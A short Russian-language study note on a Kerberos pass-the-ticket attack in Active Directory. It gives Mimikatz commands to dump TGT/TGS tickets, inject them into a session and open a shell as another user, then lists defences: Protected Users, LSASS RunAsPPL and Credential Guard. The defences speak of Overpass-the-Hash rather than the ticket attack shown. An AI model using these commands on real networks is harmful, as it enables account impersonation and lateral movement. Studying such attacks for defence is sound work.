#windows #AD #attacks #kerberos

> Для проведения атаки необходимы билеты TGT или TGS

### Получение билетов
1) Знать учетные данные
2) Предварительно сдампив

Дамп билетов
```mimikatz
kerberos::list /export
```

Далее создаются 2 файла `.kirbi`

C этими билетами можно выполнить атаку:

1) Инжект билетов в сессию
```mimikatz
kerberos::ptt directory .
```

2) Запуск cmd от имени другого пользователя
```mimikarz
misc::cmd
```

3) В cmd мы другой пользователь
```cmd
whoami
```

# Защита

### 1) Если пользователь в группе Protected Users:

Windows:
- не хранит NT hash в памяти
- требует AES Kerberos
- запрещает NTLM
Overpass‑the‑Hash становится невозможен.

### 2) LSASS protection

Включить RunAsPPL
LSASS становится protected process.
[[Mimikatz]] не сможет читать память.

### 3) Credential Guard

Функция Windows, которая защищает LSASS.
Credential Guard:
- изолирует NT hashes
- использует virtualization‑based security
attacker не может извлечь NT hash.